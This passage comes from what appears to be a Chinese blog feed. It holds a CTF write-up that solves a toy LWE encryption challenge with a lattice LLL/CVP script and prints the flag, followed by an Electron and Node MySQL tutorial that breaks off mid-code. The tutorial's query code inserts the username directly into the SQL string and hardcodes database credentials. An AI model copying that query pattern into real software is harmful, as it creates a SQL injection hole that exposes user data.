class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, V</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random_U</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="comment"># U1为上三角行列式</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_U1</span>():</span><br><span class="line">        A = Matrix(ZZ, n, n)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n):</span><br><span class="line">                <span class="keyword">if</span> i &lt; j:</span><br><span class="line">                    A[i, j] = random.randint(<span class="number">1</span>, <span class="number">1000</span>)</span><br><span class="line">                <span class="keyword">if</span> i == j:</span><br><span class="line">                    A[i, j] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> A</span><br><span class="line">    <span class="comment"># U2为下三角行列式</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_U2</span>():</span><br><span class="line">        A = Matrix(ZZ, n, n)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n):</span><br><span class="line">                <span class="keyword">if</span> i &gt; j:</span><br><span class="line">                    A[i, j] = random.randint(<span class="number">1</span>, <span class="number">1000</span>)</span><br><span class="line">                <span class="keyword">if</span> i == j:</span><br><span class="line">                    A[i, j] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> get_U1() * get_U2()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_public_key</span>():</span><br><span class="line">    U = get_random_U(<span class="number">9</span>)</span><br><span class="line">    V = matrix(V)</span><br><span class="line">    W = V * U</span><br><span class="line">    <span class="keyword">return</span> W</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random_r</span>():</span><br><span class="line">    n = <span class="number">9</span></span><br><span class="line">    delta = <span class="number">4</span></span><br><span class="line">    r = random_vector(ZZ, n, x=-delta + <span class="number">1</span>, y=delta)</span><br><span class="line">    r = matrix(r)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>():</span><br><span class="line">    M = [getPrime(<span class="number">10</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line">    m = matrix(M)</span><br><span class="line">    W = get_public_key()</span><br><span class="line">    r = get_random_r()</span><br><span class="line">    e = m * W + r  <span class="comment"># 有噪音的高斯消除问题(误差还原LWE问题)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;W =&quot;</span>, W)</span><br><span class="line">    <span class="keyword">return</span> M</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_encrypt</span>():</span><br><span class="line">    M = encrypt()</span><br><span class="line">    key = hashlib.sha256(<span class="built_in">str</span>(M).encode()).digest()</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    c = cipher.encrypt(flag).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new_encrypt()</span><br><span class="line"><span class="comment"># e = [151991736758354 115130361237591  58905390613532 130965235357066  74614897867998  48099459442369  45894485782943   7933340009592     25794185638]</span></span><br><span class="line"><span class="comment"># W = [-10150241248 -11679953514  -8802490385 -12260198788 -10290571893   -334269043 -11669932300  -2158827458     -7021995]</span></span><br><span class="line"><span class="comment"># [ 52255960212  48054224859  28230779201  43264260760  20836572799   8191198018  14000400181   4370731005     14251110]</span></span><br><span class="line"><span class="comment"># [  2274129180  -1678741826  -1009050115   1858488045    978763435   4717368685   -561197285  -1999440633     -6540190]</span></span><br><span class="line"><span class="comment"># [ 45454841384  34351838833  19058600591  39744104894  21481706222  14785555279  13193105539   2306952916      7501297]</span></span><br><span class="line"><span class="comment"># [-16804706629 -13041485360  -8292982763 -16801260566  -9211427035  -4808377155  -6530124040  -2572433293     -8393737]</span></span><br><span class="line"><span class="comment"># [ 28223439540  19293284310   5217202426  27179839904  23182044384  10788207024  18495479452   4007452688     13046387]</span></span><br><span class="line"><span class="comment"># [   968256091  -1507028552   1677187853   8685590653   9696793863   2942265602  10534454095   2668834317      8694828]</span></span><br><span class="line"><span class="comment"># [ 33556338459  26577210571  16558795385  28327066095  10684900266   9113388576   2446282316   -173705548      -577070]</span></span><br><span class="line"><span class="comment"># [ 35404775180  32321129676  15071970630  24947264815  14402999486   5857384379  10620159241   2408185012      7841686]</span></span><br><span class="line"><span class="comment"># c =1070260d8986d5e3c4b7e672a6f1ef2c185c7fff682f99cc4a8e49cfce168aa0</span></span><br></pre></td></tr></table></figure><p>LWE问题，我看别人说的是(因为我非常外行，如有错漏，希望读者可以指出)，<code>e = m * W + r</code>就是一个LWE的问题，这里需要求的是<code>m</code>，给的是<code>e、W</code>，然后<code>r</code>是一个随机生成的matrix</p><p><img src="/2021/11/07/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Cryptography//image-20211125221252603.png"></p><p>然后这里我是什么都不会的，看别人的脚本，简单了解一下，看看能不能看懂他们的解题脚本，解释都在脚本里面了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = [<span class="number">151991736758354</span>,<span class="number">115130361237591</span>,<span class="number">58905390613532</span>,<span class="number">130965235357066</span>,<span class="number">74614897867998</span>,<span class="number">48099459442369</span>,<span class="number">45894485782943</span>,<span class="number">7933340009592</span>,<span class="number">25794185638</span>]</span><br><span class="line"></span><br><span class="line">W = [[-<span class="number">10150241248</span>,-<span class="number">11679953514</span>,-<span class="number">8802490385</span>,-<span class="number">12260198788</span>,-<span class="number">10290571893</span>,-<span class="number">334269043</span>,-<span class="number">11669932300</span>,-<span class="number">2158827458</span>,-<span class="number">7021995</span>],\</span><br><span class="line">[<span class="number">52255960212</span>,<span class="number">48054224859</span>,<span class="number">28230779201</span>,<span class="number">43264260760</span>,<span class="number">20836572799</span>,<span class="number">8191198018</span>,<span class="number">14000400181</span>,<span class="number">4370731005</span>,<span class="number">14251110</span>],\</span><br><span class="line">[<span class="number">2274129180</span>,-<span class="number">1678741826</span>,-<span class="number">1009050115</span>,<span class="number">1858488045</span>,<span class="number">978763435</span>,<span class="number">4717368685</span>,-<span class="number">561197285</span>,-<span class="number">1999440633</span>,-<span class="number">6540190</span>],\</span><br><span class="line">[<span class="number">45454841384</span>,<span class="number">34351838833</span>,<span class="number">19058600591</span>,<span class="number">39744104894</span>,<span class="number">21481706222</span>,<span class="number">14785555279</span>,<span class="number">13193105539</span>,<span class="number">2306952916</span>,<span class="number">7501297</span>],\</span><br><span class="line">[-<span class="number">16804706629</span>,-<span class="number">13041485360</span>,-<span class="number">8292982763</span>,-<span class="number">16801260566</span>,-<span class="number">9211427035</span>,-<span class="number">4808377155</span>,-<span class="number">6530124040</span>,-<span class="number">2572433293</span>,-<span class="number">8393737</span>],\</span><br><span class="line">[<span class="number">28223439540</span>,<span class="number">19293284310</span>,<span class="number">5217202426</span>,<span class="number">27179839904</span>,<span class="number">23182044384</span>,<span class="number">10788207024</span>,<span class="number">18495479452</span>,<span class="number">4007452688</span>,<span class="number">13046387</span>],\</span><br><span class="line">[<span class="number">968256091</span>,-<span class="number">1507028552</span>,<span class="number">1677187853</span>,<span class="number">8685590653</span>,<span class="number">9696793863</span>,<span class="number">2942265602</span>,<span class="number">10534454095</span>,<span class="number">2668834317</span>,<span class="number">8694828</span>],\</span><br><span class="line">[<span class="number">33556338459</span>,<span class="number">26577210571</span>,<span class="number">16558795385</span>,<span class="number">28327066095</span>,<span class="number">10684900266</span>,<span class="number">9113388576</span>,<span class="number">2446282316</span>,-<span class="number">173705548</span>,-<span class="number">577070</span>],\</span><br><span class="line">[<span class="number">35404775180</span>,<span class="number">32321129676</span>,<span class="number">15071970630</span>,<span class="number">24947264815</span>,<span class="number">14402999486</span>,<span class="number">5857384379</span>,<span class="number">10620159241</span>,<span class="number">2408185012</span>,<span class="number">7841686</span>]]</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;1070260d8986d5e3c4b7e672a6f1ef2c185c7fff682f99cc4a8e49cfce168aa0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CVP</span>(<span class="params">lattice, target</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;executing Gram_Schmidt&quot;</span>)</span><br><span class="line">    gram = lattice.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finish&quot;</span>)</span><br><span class="line">    t = target</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(lattice.nrows())):</span><br><span class="line">        c = ((t * gram[i]) / (gram[i] * gram[i])).<span class="built_in">round</span>()</span><br><span class="line">        t -= lattice[i] * c</span><br><span class="line">    <span class="keyword">return</span> target - t</span><br><span class="line"></span><br><span class="line">A = matrix(ZZ, W)</span><br><span class="line">B = matrix(ZZ, W)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Executing LLL&quot;</span>)</span><br><span class="line">lattice = IntegerLattice(B, lll_reduce=<span class="literal">True</span>)  <span class="comment">#lll获得格内约减基</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Finish&quot;</span>)</span><br><span class="line"></span><br><span class="line">target = vector(ZZ, e)  <span class="comment"># 将list转为vector</span></span><br><span class="line">P=CVP(lattice.reduced_basis,target)  <span class="comment"># 执行CVP解脚本，获得的应该就是带有噪音r的，即m * W = e - r，这个P应该就是e-r吧(或者说是一个格点?)</span></span><br><span class="line"></span><br><span class="line">solution=A.solve_left(P)  <span class="comment"># 求得solution x A=P，求得左乘的内容，即是m。就是key。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">c = <span class="number">0x1070260d8986d5e3c4b7e672a6f1ef2c185c7fff682f99cc4a8e49cfce168aa0</span></span><br><span class="line">M=[<span class="number">877</span>, <span class="number">619</span>, <span class="number">919</span>, <span class="number">977</span>, <span class="number">541</span>, <span class="number">941</span>, <span class="number">947</span>, <span class="number">1031</span>, <span class="number">821</span>]</span><br><span class="line">key = hashlib.sha256(<span class="built_in">str</span>(M).encode()).digest()</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(cipher.decrypt(long_to_bytes(c)))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;be5152d04a49234a251956a32b&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 共模攻击 </tag>
            
            <tag> CBC翻转攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Electron初体验</title>
      <link href="/2021/11/03/Electron%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
      <url>/2021/11/03/Electron%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir my-electron-app &amp;&amp; cd my-electron-app</span><br><span class="line">npm init</span><br><span class="line">npm install --save-dev electron</span><br></pre></td></tr></table></figure><p>接下来就是创建主要的文件了，主要有<code>index.html</code>、<code>index.js</code>、<code>preload.js</code>。</p><h3 id="打包遇到问题"><a href="#打包遇到问题" class="headerlink" title="打包遇到问题"></a>打包遇到问题</h3><p>​这里使用官网推荐的打包方案时出现了一点点小小的错误，如下所示，修了半天也没修好，索性换一种打包方案了。</p><p><img src="/2021/11/03/Electron%E5%88%9D%E4%BD%93%E9%AA%8C//image-20211103125439320.png" alt="image-20211103125439320"></p><h3 id="另一种打包方案"><a href="#另一种打包方案" class="headerlink" title="另一种打包方案"></a>另一种打包方案</h3><h4 id="electron-packager打包可执行文件"><a href="#electron-packager打包可执行文件" class="headerlink" title="electron-packager打包可执行文件"></a>electron-packager打包可执行文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i electron-packager --save-dev</span><br></pre></td></tr></table></figure><ol><li>在package.json中添加下面的script。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;package&quot;: &quot;electron-packager . ElectronDemo --platform=win32 --arch=x64 --icon=computer.ico --out=./out --app-version=0.0.1 --overwrite --ignore=node_modules&quot;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><ol start="2"><li>打包可执行文件命令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ npm run package</span><br><span class="line"></span><br><span class="line">&gt; myelectronapp@1.0.0 package</span><br><span class="line">&gt; electron-packager . ElectronDemo --platform=win32 --arch=x64 --icon=computer.ico --out=./out --app-version=0.0.1 --overwrite --ignore=node_modules</span><br><span class="line"></span><br><span class="line">Packaging app for platform win32 x64 using electron v15.3.0</span><br><span class="line">WARNING: Could not find icon &quot;computer.ico&quot;, not updating app icon</span><br><span class="line">Wrote new app to out\ElectronDemo-win32-x64</span><br></pre></td></tr></table></figure><h4 id="electron-builder打包安装包"><a href="#electron-builder打包安装包" class="headerlink" title="electron-builder打包安装包"></a>electron-builder打包安装包</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i electron-builder --save-dev</span><br></pre></td></tr></table></figure><ol><li>在package.json文件中添加一下代码:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&quot;build&quot;: &#123;</span><br><span class="line">    &quot;appId&quot;: &quot;com.example.app&quot;,</span><br><span class="line">    &quot;mac&quot;: &#123;</span><br><span class="line">      &quot;target&quot;: [ // 目标包类型</span><br><span class="line">        &quot;dmg&quot;,</span><br><span class="line">        &quot;zip&quot;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;win&quot;: &#123;</span><br><span class="line">      &quot;target&quot;: [ // 目标包类型</span><br><span class="line">        &quot;nsis&quot;,</span><br><span class="line">        &quot;zip&quot;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"> &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;dist&quot;: &quot;electron-builder&quot;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><ol start="2"><li>自定义安装路径，要在buid字段里面添加个nsis的节点，其中有2个配置项是关键点：</li></ol><ul><li>oneClick设置为false</li><li>allowToChangeInstallationDirectory设置为true</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&quot;build&quot;: &#123;</span><br><span class="line">    &quot;appId&quot;: &quot;com.example.app&quot;,</span><br><span class="line">    &quot;mac&quot;: &#123;</span><br><span class="line">      &quot;target&quot;: [</span><br><span class="line">        &quot;dmg&quot;,</span><br><span class="line">        &quot;zip&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;icon&quot;: &quot;img.ico&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;win&quot;: &#123;</span><br><span class="line">      &quot;target&quot;: [</span><br><span class="line">        &quot;nsis&quot;,</span><br><span class="line">        &quot;zip&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;icon&quot;: &quot;img.ico&quot; // 更换桌面上生成的图标</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;nsis&quot;: &#123;</span><br><span class="line">      &quot;oneClick&quot;: false, // 是否一键安装，建议为 false，可以让用户点击下一步、下一步、下一步的形式安装程序，如果为true，当用户双击构建好的程序，自动安装程序并打开，即：一键安装</span><br><span class="line">      &quot;allowToChangeInstallationDirectory&quot;: true, // 允许修改安装目录，建议为 true，是否允许用户改变安装目录，默认是不允许</span><br><span class="line">      &quot;createDesktopShortcut&quot;: true, // 创建桌面图标</span><br><span class="line">      &quot;createStartMenuShortcut&quot;: true, // 创建开始菜单图标</span><br><span class="line">      &quot;installerIcon&quot;: &quot;test.ico&quot;, // 安装图标</span><br><span class="line">      &quot;uninstallerIcon&quot;: &quot;xxx.ico&quot;, // 卸载图标</span><br><span class="line">      &quot;installerHeaderIcon&quot;: &quot;xxx.ico&quot; // 安装时头部图标</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;scripts&quot;: &#123;</span><br><span class="line">      &quot;dist&quot;: &quot;electron-builder&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>上面的json内容仅为示例，运行下面的打包命令的时候要把注释去掉，还有你不想设置icon图标的话，去掉即可，所有图标就是默认的了。</p><ol start="3"><li>打包所使用的命令为：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm run dist</span><br></pre></td></tr></table></figure><h4 id="上面都配置好后打包命令"><a href="#上面都配置好后打包命令" class="headerlink" title="上面都配置好后打包命令"></a>上面都配置好后打包命令</h4><p>​把上面的东西都搞好之后，再重新打包就简单多了，直接两个命令即可解决。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run package &amp;&amp; npm run dist</span><br></pre></td></tr></table></figure><h2 id="Electron配合Bootstrap使用"><a href="#Electron配合Bootstrap使用" class="headerlink" title="Electron配合Bootstrap使用"></a>Electron配合Bootstrap使用</h2><p>​很简单，站在巨人的肩膀上解决了问题。<a href="http://caoyudong.com/2018/05/01/Electron%E4%B8%AD%E4%BD%BF%E7%94%A8Bootstrap%E5%92%8CJQuery/">巨人的博客</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install bootstrap --save</span><br><span class="line">npm install JQuery --save</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Electron连接数据库"><a href="#Electron连接数据库" class="headerlink" title="Electron连接数据库"></a>Electron连接数据库</h2><p>​怎么说呢？这个客户端连接数据库的问题，我想着应该是不能直接将数据库连接方式写到这个程序里面的，这个程序如果被逆向将会造成非常严重的数据泄露，所以最好还是把数据库服务放到服务端里面，然后本地进行查询数据库的时候，只需要访问服务端的接口即可。这里为了磨练自己的node开发能力，这里的服务端的数据库连接接口我决定使用node来编写。</p><h3 id="连接Mysql测试"><a href="#连接Mysql测试" class="headerlink" title="连接Mysql测试"></a>连接Mysql测试</h3><ol><li>首先npm init一个server的文件夹，node的入口设为<code>main.js</code></li><li><code>npm install mysql</code>下载数据库模块</li><li>新建<code>main.js</code>文件，并将以下代码写入文件</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mysql      = <span class="built_in">require</span>(<span class="string">&#x27;mysql&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> connection = mysql.<span class="title function_">createConnection</span>(&#123;</span><br><span class="line">  host     : <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">  user     : <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">  password : <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">  database : <span class="string">&#x27;user&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">connection.<span class="title function_">connect</span>();</span><br><span class="line"> </span><br><span class="line">connection.<span class="title function_">query</span>(<span class="string">&#x27;SELECT 1 + 1 AS solution&#x27;</span>, <span class="keyword">function</span> (<span class="params">error, results, fields</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (error) <span class="keyword">throw</span> error;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;The solution is: &#x27;</span>, results[<span class="number">0</span>].<span class="property">solution</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Mysql表内添加内容"><a href="#Mysql表内添加内容" class="headerlink" title="Mysql表内添加内容"></a>Mysql表内添加内容</h3><p>​这里使用方便快捷的数据库操作软件，<code>Navicat Premium 12</code>。</p><ol><li>直接先连上数据库，再进user库里面添加一个user表</li></ol><p><img src="/2021/11/03/Electron%E5%88%9D%E4%BD%93%E9%AA%8C//image-20211104134613013.png"></p><ol start="2"><li>再随便整一个用户名一个密码即可。</li></ol><p><img src="/2021/11/03/Electron%E5%88%9D%E4%BD%93%E9%AA%8C//image-20211104134728980.png" alt="image-20211104134728980"></p><h3 id="Mysql数据查询测试-异步问题解决"><a href="#Mysql数据查询测试-异步问题解决" class="headerlink" title="Mysql数据查询测试(异步问题解决)"></a>Mysql数据查询测试(异步问题解决)</h3><p>​这个查询数据与返回数据到前台的时候有一个node的异步的、非阻塞的流程导致的小问题，就是在接收返回值的时候得到了undefined，研究了半天，才解决了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mysql      = <span class="built_in">require</span>(<span class="string">&#x27;mysql&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createconnection</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> connection = mysql.<span class="title function_">createConnection</span>(&#123;</span><br><span class="line">        host     : <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">        user     : <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">        password : <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">        database : <span class="string">&#x27;user&#x27;</span></span><br><span class="line">      &#125;);</span><br><span class="line">    <span class="keyword">return</span> connection;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">GetPassword</span>(<span class="params">username</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> connection = <span class="title function_">createconnection</span>();</span><br><span class="line">    connection.<span class="title function_">connect</span>();</span><br><span class="line">    <span class="keyword">const</span> sql = <span class="string">`SELECT PASSWORD FROM user WHERE username=&quot;<span class="subst">$&#123;username&#125;</span>&quot;`</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(sql);</span><br><span class="line">    <span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> </span><br><span class="line">        &#123;</span><br><span class="line">            connection.<span class="title function_">query</span>(sql, <span 